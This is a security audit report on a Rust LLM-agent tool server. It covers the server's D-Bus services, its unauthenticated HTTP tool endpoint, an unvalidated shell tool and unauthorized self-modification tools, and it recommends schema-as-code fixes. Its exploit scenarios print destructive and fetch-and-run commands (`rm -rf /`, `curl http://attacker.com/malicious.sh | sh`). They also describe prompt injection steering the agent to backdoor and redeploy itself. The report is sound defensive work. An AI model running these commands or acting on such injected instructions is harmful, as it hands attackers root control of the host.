# D-Bus & IPC Attack Surface Audit Report

---

## 1. D-Bus & IPC Attack Surface Registry

The following registry inventories all D-Bus interfaces, methods, and signals registered or invoked within the audited files, along with their bus connectivity, identity verification status, and deserialization safety.

### 1.1 Registered D-Bus Services (Servers)

#### Interface: `org.dbusmcp.Agent`
* **File of Origin**: `crates/op-tools/src/builtin/agent_tool.rs:319`
* **Bus Type**: System Bus by default (dynamically falls back to Session Bus only if `DBUS_SESSION_BUS_ADDRESS` is set, or overridden via `OP_AGENT_BUS` env var; see line 257).
* **Methods**:
  * `Name() -> s` (Returns the agent name string)
    * *Caller Identity Checked*: **No**
    * *Spawns Processes / Mutates State*: No
    * *Deserialization Safety*: Safe (returns statically defined string)
  * `Description() -> s` (Returns the agent description string)
    * *Caller Identity Checked*: **No**
    * *Spawns Processes / Mutates State*: No
    * *Deserialization Safety*: Safe (returns statically defined string)
  * `Operations() -> as` (Returns a list of supported operations)
    * *Caller Identity Checked*: **No**
    * *Spawns Processes / Mutates State*: No
    * *Deserialization Safety*: Safe (returns statically defined array of strings)
  * `Execute(task_json: s) -> s` (Dispatches an arbitrary task JSON string to the agent)
    * *Caller Identity Checked*: **No**
    * *Spawns Processes / Mutates State*: **Yes** (Spawns agent operations and mutates state depending on the task payload)
    * *Deserialization Safety*: **Vulnerable** (Deserializes raw, unvalidated caller-supplied JSON string `task_json` using `unsafe { simd_json::from_str }` at line 335).
* **Signals**: None registered.

---

### 1.2 D-Bus Clients (Outgoing Proxies)

The codebase contains several client tools that invoke external D-Bus services on the **System Bus**. These tools act as vectors for privilege escalation if exposed to untrusted execution paths:

#### Target Service: `org.freedesktop.PackageKit`
* **Audited Files**: `crates/op-tools/src/builtin/packagekit.rs:163`, `crates/op-tools/src/bin/op-packagekit-install.rs:55`
* **Methods Invoked**: 
  * `CreateTransaction` (Path: `/org/freedesktop/PackageKit`)
  * `Resolve` (Path: `/org/freedesktop/PackageKit/Transaction/...`)
  * `InstallPackages` (Path: `/org/freedesktop/PackageKit/Transaction/...`)
  * `RemovePackages` (Path: `/org/freedesktop/PackageKit/Transaction/...`)

#### Target Service: `org.freedesktop.systemd1`
* **Audited Files**: `crates/op-tools/src/builtin/dbus.rs:59`, `crates/op-tools/src/builtin/dbus_hybrid.rs:326`
* **Methods Invoked**:
  * `StartUnit` (Path: `/org/freedesktop/systemd1`)
  * `StopUnit` (Path: `/org/freedesktop/systemd1`)
  * `RestartUnit` (Path: `/org/freedesktop/systemd1`)
  * `GetUnit` (Path: `/org/freedesktop/systemd1`)
  * `ListUnits` (Path: `/org/freedesktop/systemd1`)
  * `ListUnitFiles` (Path: `/org/freedesktop/systemd1`)

#### Target Service: `org.freedesktop.NetworkManager`
* **Audited Files**: `crates/op-tools/src/builtin/dbus_hybrid.rs:364`
* **Methods Invoked**:
  * `GetDevices` (Path: `/org/freedesktop/NetworkManager`)
  * `GetAllDevices` (Path: `/org/freedesktop/NetworkManager`)
  * `ActivateConnection` (Path: `/org/freedesktop/NetworkManager`)
  * `DeactivateConnection` (Path: `/org/freedesktop/NetworkManager`)

#### Target Service: `org.chimera.dinit`
* **Audited Files**: `crates/op-tools/src/builtin/dinit.rs:43`
* **Methods Invoked**:
  * `StartService` (Path: `/org/chimera/dinit`)
  * `StopService` (Path: `/org/chimera/dinit`)
  * `GetServiceStatus` (Path: `/org/chimera/dinit`)
  * `ListServices` (Path: `/org/chimera/dinit`)

---

## 2. Production Security Audit Findings

### 2.1 Critical Findings

#### Finding 1: Unauthenticated Tool Execution HTTP Router Endpoint Exposes Remote Code Execution (RCE)
* **File Citation**: `crates/op-tools/src/router.rs:88` (`execute_tool_handler`)
* **Vulnerability Type**: Missing Authentication and Authorization / Security Bypass
* **Severity**: **Critical**
* **Description**:
  The HTTP endpoint `POST /api/tools/:name/execute` is mapped directly to `execute_tool_handler`. This handler retrieves the requested tool from the `ToolRegistry` and immediately executes it using user-supplied parameters:
  ```rust
  async fn execute_tool_handler(
      State(state): State<ToolsState>,
      axum::extract::Path(name): axum::extract::Path<String>,
      Json(params): Json<Value>,
  ) -> impl IntoResponse {
      if let Some(tool) = state.registry.get(&name).await {
          match tool.execute(params).await { ... }
      }
  }
  ```
  The endpoint performs no authentication, authorization, token verification, or caller identity validation. Moreover, it completely bypasses the `InputValidator` defined in `crates/op-tools/src/validation.rs`.
* **Exploit Scenario**:
  An unauthenticated remote attacker can send an HTTP POST request to `/api/tools/shell_execute/execute` containing arbitrary bash commands in the JSON payload (e.g., `{"command": "rm -rf /"}`). Since `ShellExecuteTool` (compiled in `builtin/shell_tool.rs` and registered in `builtin/mod.rs`) runs with host administrator/root privileges, the attacker gains immediate, unrestricted root RCE on the host.

---

#### Finding 2: `ShellExecuteTool` Lacks Security and Input Validation
* **File Citation**: `crates/op-tools/src/builtin/shell_tool.rs:21` (also duplicated at `crates/op-tools/src/builtin_old.rs:144`)
* **Vulnerability Type**: Remote Code Execution / Input Validation Bypass
* **Severity**: **Critical**
* **Description**:
  The `ShellExecuteTool` in `shell_tool.rs` executes shell commands directly via `bash -c` using the following logic:
  ```rust
  let result = tokio::time::timeout(
      std::time::Duration::from_secs(timeout_secs),
      execute_command(command, working_dir),
  )
  .await;
  ```
  Unlike the `ShellExecuteTool` in `shell.rs`, this implementation does not load or query the global `SecurityValidator` (from `security.rs`), nor does it run `InputValidator::validate_input`. It directly spawns a subprocess with unsanitized caller input.
* **Exploit Scenario**:
  An attacker can call this tool through the exposed HTTP router or via any prompt injection vector on the LLM agent, executing arbitrary commands on the system.

---

#### Finding 3: `ShellTool` Completely Bypasses Its Own Command Whitelist
* **File Citation**: `crates/op-tools/src/builtin_old.rs:144`
* **Vulnerability Type**: Incomplete Input Validation / Logic Flaw
* **Severity**: **Critical**
* **Description**:
  `ShellTool` specifies an `allowed_commands` list (such as `ls`, `cat`, etc.) and defines a validation helper `fn validate(&self, args: &simd_json::OwnedValue) -> Result<(), String>` at line 124. 
  However, `ShellTool`'s `execute` implementation does *not* invoke `validate` before spawning the process:
  ```rust
  async fn execute(&self, request: ToolRequest) -> ToolResult {
      let start = std::time::Instant::now();
      
      let command = match request.arguments.get("command").and_then(|v| v.as_str()) { ... };
      // ...
      match tokio::process::Command::new("sh")
          .arg("-c")
          .arg(format!("{} {}", command, args.join(" ")))
          .output()
          .await
  ```
  Because `validate` is not defined in the `Tool` trait, and neither the registry nor the executor calls `validate` on tool execution, the command restriction is completely ignored.
* **Exploit Scenario**:
  Even if an operator assumes that using `builtin_old::register_builtins` limits users to safe commands, any user can execute arbitrary commands (e.g., `curl http://attacker.com/malicious.sh | sh`) because `validate` is dead code.

---

#### Finding 4: Dynamic D-Bus Introspection Client Exposes Arbitrary System Modification
* **File Citation**: `crates/op-tools/src/builtin/dbus_introspection.rs:1046` (`DbusCallMethodTool`)
* **Vulnerability Type**: Privilege Escalation / Unrestricted System Mutation
* **Severity**: **Critical**
* **Description**:
  `DbusCallMethodTool` is registered as a public-facing tool. It takes arbitrary `service`, `path`, `interface`, and `method` arguments alongside raw parameters, and executes the target method on the System bus:
  ```rust
  let connection = match bus {
      BusType::System => Connection::system().await?,
      BusType::Session => Connection::session().await?,
  };
  let proxy = zbus::Proxy::new(&connection, service.as_str(), path.as_str(), interface.as_str()).await?;
  let result: zbus::zvariant::OwnedValue = proxy.call(method.as_str(), &zbus_args).await?;
  ```
  If exposed through the HTTP API, this allows any caller to interact with highly privileged system services (e.g., calling `org.freedesktop.systemd1.Manager.StartUnit` to start a backdoored service or `org.freedesktop.PackageKit` to install malicious packages).
* **Exploit Scenario**:
  An attacker sends an HTTP POST request to `/api/tools/dbus_call_method/execute` with parameters targeting `org.freedesktop.systemd1` to restart sshd or stop the host firewall, bypassing OS-level permission boundaries.

---

#### Finding 5: Self-Modification Write Tool Lacks Verification and Code Signing
* **File Citation**: `crates/op-tools/src/builtin/self_tools.rs:214` (`SelfWriteFileTool`)
* **Vulnerability Type**: Integrity Violation / Self-Modification RCE
* **Severity**: **Critical**
* **Description**:
  The `SelfWriteFileTool` allows the chatbot to write arbitrary strings directly into its own source code files. When combined with `SelfBuildTool` (`cargo build`) and `SelfDeployTool` (`systemctl restart`), this forms an automated compiler pipeline. There is no cryptographic validation, signature verification, or manual authorization step required before overwriting active codebase files.
* **Exploit Scenario**:
  An attacker uses an LLM prompt injection or the exposed HTTP API to invoke `self_write_file` with a payload that inserts a reverse-shell backdoor into the server startup logic. They then call `self_build` and `self_deploy`, instantly restarting the service with the backdoored binary.

---

### 2.2 High & Medium Findings

#### Finding 6: Local Privilege Escalation via Unauthenticated D-Bus Agent Service
* **File Citation**: `crates/op-tools/src/builtin/agent_tool.rs:319` (`AgentDbusService`)
* **Vulnerability Type**: Missing Peer Credential Validation / Authorization Bypass
* **Severity**: **High**
* **Description**:
  `AgentDbusService` registers on the system-wide D-Bus bus (via `Connection::system()` when `default_agent_bus()` returns `BusType::System`). It exposes the `Execute` method which processes actions on behalf of the service.
  The service does *not* validate the sender's credentials (e.g., by checking the peer's UID/GID using `zbus::Connection::peer_credentials()`). Consequently, any unprivileged local user or containerized process connected to the system bus can invoke the `Execute` method and coerce the high-privilege agent into executing tasks.
* **Exploit Scenario**:
  A local unprivileged user on the host issues a `dbus-send` command to `org.dbusmcp.Agent` requesting privileged file modifications or language compiler tasks, which are executed under the agent process's root context.

---

#### Finding 7: Unsafe JSON Parsing on Untrusted D-Bus Message Payloads
* **File Citation**: `crates/op-tools/src/builtin/agent_tool.rs:335`
* **Vulnerability Type**: Memory/Deserialization Safety
* **Severity**: **High**
* **Description**:
  The `Execute` method in `AgentDbusService` parses the incoming `task_json` string using an unsafe block:
  ```rust
  let mut task_json_mut = task_json.to_string();
  let task: Value = match unsafe { simd_json::from_str(&mut task_json_mut) } { ... }
  ```
  `simd_json::from_str` expects a mutable slice and assumes specific padding and structural constraints. Passing a raw, unvalidated string directly from an untrusted D-Bus peer into an `unsafe` JSON parser bypasses the library's safe wrappers, which can lead to memory corruption or crashes if the peer sends a specially crafted, non-padded, or malformed JSON payload.

---

#### Finding 8: Global Security Configuration Lack of System Bus Policy
* **File Citation**: `crates/op-tools/src/builtin/agent_tool.rs:257`
* **Vulnerability Type**: Over-permissioned Default Configuration
* **Severity**: **Medium**
* **Description**:
  The default D-Bus connection is established on the system bus. No XML system bus security policy (typically placed in `/usr/share/dbus-1/system.d/`) is provided in the repository to restrict access. Without an explicit XML policy file limiting the `send_destination` of the `org.dbusmcp.Agent` service, D-Bus defaults to allowing all local users to send messages to the registered destination.

---

## 3. Schema-as-Code & OSCAL Compliance Violations

This codebase is governed by a **schema-as-code** discipline. Ad-hoc data structures, unstructured string contracts, or loose JSON schemas must be replaced with versioned, authoritative Protobuf schemas or OSCAL-compliant system security profiles. The following architectural violations were identified:

### 3.1 Ad-Hoc JSON Schema Declarations in Tool Definitions
* **File Citations**: 
  * `crates/op-tools/src/builtin_old.rs:24` (Echo tool schema)
  * `crates/op-tools/src/builtin/file.rs:113` (File tool schema)
  * `crates/op-tools/src/builtin/rtnetlink_tools.rs:33` (Netlink tool schema)
* **Violation Description**:
  Data contracts are expressed as ad-hoc JSON literals using the `json!({ ... })` macro directly inside Rust source files. This breaks schema-as-code principles as these schemas are not compiled, versioned, or generated from a single source of truth (such as Protocol Buffers or a central JSON schema registry).
* **Remediation**:
  Define tool input and output structures as versioned Protocol Buffer messages (e.g., `v1.EchoRequest`) and auto-generate the JSON/Protobuf parsing structures to enforce strict contract boundaries.

---

### 3.2 Ad-Hoc Serialization of D-Bus Payloads
* **File Citation**: `crates/op-tools/src/builtin/agent_tool.rs:335`
* **Violation Description**:
  The `Execute` method accepts an unstructured string payload (`task_json`) and deserializes it directly into a loose, dynamically-typed `simd_json::OwnedValue` map. This is an anti-pattern under schema-as-code discipline, as it lacks a versioned contract schema.
* **Remediation**:
  Expose structured D-Bus arguments, or utilize serialized versioned Protocol Buffer bytes (`bytes` or D-Bus array of bytes `ay`) instead of unstructured JSON strings.

---

### 3.3 Dynamic Schema Generation from D-Bus Signatures
* **File Citation**: `crates/op-tools/src/builtin/dbus_hybrid.rs:81` (`generate_schema_from_signature`)
* **Violation Description**:
  This function parses raw D-Bus signature characters (e.g., `s`, `i`, `b`, `o`) at runtime to build a dynamic JSON schema. Doing so makes the schema representation non-deterministic, hard to audit, and entirely separated from the versioned schema registry.
* **Remediation**:
  Replace dynamic signature translation with statically generated, versioned metadata files (e.g., OSCAL Component Definitions) mapped to each projected service.